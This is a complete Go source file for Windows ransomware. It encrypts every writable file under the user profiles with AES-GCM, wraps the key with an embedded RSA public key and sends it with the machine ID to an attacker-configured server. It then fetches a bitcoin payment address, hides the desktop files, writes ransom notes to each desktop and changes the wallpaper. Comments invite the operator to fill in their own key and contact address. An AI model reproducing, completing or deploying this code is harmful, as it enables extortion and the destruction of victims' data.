// +build windows
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"github.com/reujab/wallpaper"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"syscall"
	"time"
)

func fromBase10(base10 string) *big.Int {
	i, ok := new(big.Int).SetString(base10, 10)
	if !ok {
		panic("bad number: " + base10)
	}
	return i
}

var Key rsa.PublicKey

func init() {
	Key = rsa.PublicKey{
		N: fromBase10(""), // modify this
		E: 65537,
	}
}

func HideFile(filename string) error {
	filenameW, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}
	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		return err
	}
	return nil
}

func visit(files *[]string) filepath.WalkFunc {
	return func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}
		ex, err := os.Executable()
		if err != nil {
			panic(err)
		}
		if path == ex {
			return nil
		}
		if filepath.Base(path) == "decrypt.exe" {
			return nil
		}
		if info.Mode().Perm()&(1<<(uint(7))) == 0 { // black magic to check whether we have write permissions.
			return nil
		}

		*files = append(*files, path)
		return nil
	}
}

// NewEncryptionKey generates a random 256-bit key for Encrypt() and
// Decrypt(). It panics if the source of randomness fails.
func NewEncryptionKey() *[32]byte {
	key := [32]byte{}
	_, err := io.ReadFull(rand.Reader, key[:])
	if err != nil {
		panic(err)
	}
	return &key
}

// Encrypt encrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Output takes the
// form nonce|ciphertext|tag where '|' indicates concatenation.
func Encrypt(plaintext []byte, key *[32]byte) (ciphertext []byte, err error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

type PaymentInfo struct {
	Address string
	Amount  string
}

var server string = "example.com"    // server address
var contact string = "keksec@kek.hq" // whatever address suits you

func main() {
	var files []string
	var counter int = 0
	var home string

	randomKey := NewEncryptionKey()

	home = os.Getenv("HOMEDRIVE") + "\\Users\\"
	if home == "" {
		home = os.Getenv("USERPROFILE")
	}

	err := filepath.Walk(home, visit(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {
		counter++
		fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)

		data, err := ioutil.ReadFile(file)
		if err != nil {
			continue
		}

		encrypted, err := Encrypt(data, randomKey)
		if err != nil {
			log.Println(err)
			continue
		}

		err = ioutil.WriteFile(file, encrypted, 0644)
		if err != nil {
			continue
		}
	}
	fmt.Printf("\n%d files encrypted.\n", len(files))

	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &Key, randomKey[:], nil)
	if err != nil {
		log.Fatal(err)
	}
	randomKey = nil // clear key

	id, err := machineid.ID()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Sending key away.")

	for {
		response, err := http.PostForm("http://"+server+":1337/key/", url.Values{
			"key": {hex.EncodeToString(encryptedKey)},
			"id":  {id},
		})
		if err != nil {
			if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
				ioutil.WriteFile("key.txt", []byte(hex.EncodeToString(encryptedKey)), 0644)
			}

			fmt.Println("Connection failed. Retrying in 5 seconds..")
			time.Sleep(5 * time.Second)
			continue
		}
		defer response.Body.Close()
		if _, err := os.Stat("key.txt"); !os.IsNotExist(err) {
			err = os.Remove("key.txt")
			if err != nil {
				log.Fatal(err)
			}
		}
		fmt.Println("Connection established. Payment information received..")

		payment := new(PaymentInfo)

		err = json.NewDecoder(response.Body).Decode(&payment)
		if err != nil {
			log.Fatal(err)
		}
		text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id

		users, err := ioutil.ReadDir(home)
		if err != nil {
			log.Fatal(err)
		}

		for _, user := range users {
			if user.IsDir() {
				dfiles, err := ioutil.ReadDir(home + user.Name() + "\\Desktop\\")
				if err != nil {
					continue
				}

				for _, file := range dfiles {
					HideFile(home + user.Name() + "\\Desktop\\" + file.Name())
				}

				ioutil.WriteFile(home+user.Name()+"\\Desktop\\README.txt", []byte(text), 0644)
			}
		}

		err = wallpaper.SetFromURL("http://" + server + "/wallpaper.jpg")
		if err != nil {
			log.Println(err)
		}
		fmt.Println("Script execution completed successfully!")

		break
	}

	encryptedKey = nil
}
